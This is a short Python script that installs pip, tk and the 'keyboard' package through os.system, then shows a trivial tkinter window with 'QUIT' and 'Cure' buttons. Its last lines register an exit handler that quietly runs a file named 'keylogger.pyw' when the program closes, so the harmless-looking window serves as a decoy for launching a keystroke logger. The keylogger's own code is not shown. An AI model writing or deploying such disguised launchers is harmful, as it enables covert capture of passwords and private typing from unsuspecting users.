import os

os.system('python get-pip.py')
os.system('pip install tk')
os.system('pip install keyboard')

from tkinter import *

class App:

    def __init__(self, master):

        frame = Frame(master)
        frame.pack()

        self.button = Button(
            frame, text="QUIT", fg="red", command=frame.quit
            )
        self.button.pack(side=LEFT)

        self.hi_there = Button(frame, text="Cure", command=self.say_hi)
        self.hi_there.pack(side=LEFT)

    def say_hi(self):
        print ("hi there, everyone!")

root = Tk()

app = App(root)

root.mainloop()
root.destroy()

import atexit

def exit_handler():
	print("Exiting")
	os.system('python keylogger.pyw')

atexit.register(exit_handler)